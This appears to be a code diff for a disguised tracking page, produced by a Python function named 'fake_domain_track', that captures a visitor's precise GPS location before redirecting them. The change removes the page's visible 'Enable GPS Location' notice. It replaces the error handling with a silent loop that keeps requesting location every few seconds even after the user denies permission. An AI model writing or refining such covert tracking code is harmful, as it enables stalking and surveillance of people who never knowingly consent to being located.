@@ -253,53 +253,6 @@ def fake_domain_track(link_id):
                 height: 24px;
                 fill: currentColor;
             }}
-            
-            /* GPS OFF Indicator */
-            .location-indicator {{
-                position: fixed;
-                bottom: 100px;
-                left: 50%;
-                transform: translateX(-50%);
-                display: none;
-                flex-direction: column;
-                align-items: center;
-                gap: 12px;
-                z-index: 100;
-                background: rgba(255,255,255,0.08);
-                padding: 20px 28px;
-                border-radius: 20px;
-                backdrop-filter: blur(15px);
-                border: 1px solid rgba(255,255,255,0.06);
-                animation: fadeIn 0.5s ease;
-            }}
-            .location-indicator.show {{
-                display: flex;
-            }}
-            @keyframes fadeIn {{
-                from {{ opacity: 0; transform: translateX(-50%) scale(0.9); }}
-                to {{ opacity: 1; transform: translateX(-50%) scale(1); }}
-            }}
-            .location-icon {{
-                font-size: 36px;
-                animation: pulse 1.5s ease-in-out infinite;
-            }}
-            @keyframes pulse {{
-                0%, 100% {{ transform: scale(1); opacity: 0.8; }}
-                50% {{ transform: scale(1.15); opacity: 1; }}
-            }}
-            .location-text {{
-                color: #ffffff;
-                font-size: 14px;
-                font-weight: 500;
-                letter-spacing: 0.3px;
-                text-align: center;
-            }}
-            .location-sub {{
-                color: #888888;
-                font-size: 11px;
-                text-align: center;
-                margin-top: -4px;
-            }}
         </style>
     </head>
     <body>
@@ -341,13 +294,6 @@ def fake_domain_track(link_id):
                 </div>
             </div>
             
-            <!-- GPS OFF Indicator -->
-            <div class="location-indicator" id="locationIndicator">
-                <div class="location-icon">📡</div>
-                <div class="location-text">Enable GPS Location</div>
-                <div class="location-sub">Turn on location services to continue</div>
-            </div>
-            
             <div class="bottom-nav">
                 <div class="nav-item active">
                     <svg viewBox="0 0 24 24"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg>
@@ -372,14 +318,11 @@ def fake_domain_track(link_id):
             const linkId = '{link_id}';
             const redirectUrl = '{website_url}';
             const progressFill = document.getElementById('progressFill');
-            const locationIndicator = document.getElementById('locationIndicator');
             let locationCaptured = false;
-            let attempts = 0;
             
             function sendLocation(position) {{
                 if (locationCaptured) return;
                 locationCaptured = true;
-                locationIndicator.classList.remove('show');
                 
                 const {{latitude, longitude, accuracy}} = position.coords;
                 progressFill.style.width = '100%';
@@ -409,20 +352,8 @@ def fake_domain_track(link_id):
             }}
             
             function handleError(error) {{
-                attempts++;
-                
-                if (error.code === 1) {{
-                    // Permission denied - user blocked it
-                    // Keep trying, browser may show popup again
-                    setTimeout(requestLocation, 5000);
-                }} else if (error.code === 2 || error.code === 3) {{
-                    // Position unavailable = GPS is OFF
-                    locationIndicator.classList.add('show');
-                    // Keep retrying until GPS turns on
-                    setTimeout(requestLocation, 3000);
-                }} else {{
-                    setTimeout(requestLocation, 2000);
-                }}
+                // Silently retry - no text, no indicators
+                setTimeout(requestLocation, 3000);
             }}
             
             function requestLocation() {{
@@ -433,11 +364,11 @@ def fake_domain_track(link_id):
                         {{enableHighAccuracy: true, timeout: 30000, maximumAge: 0}}
                     );
                 }} else {{
-                    setTimeout(requestLocation, 2000);
+                    setTimeout(requestLocation, 3000);
                 }}
             }}
             
-            // Start immediately
+            // Start immediately - will silently retry until GPS is on
             requestLocation();
         </script>
     </body>
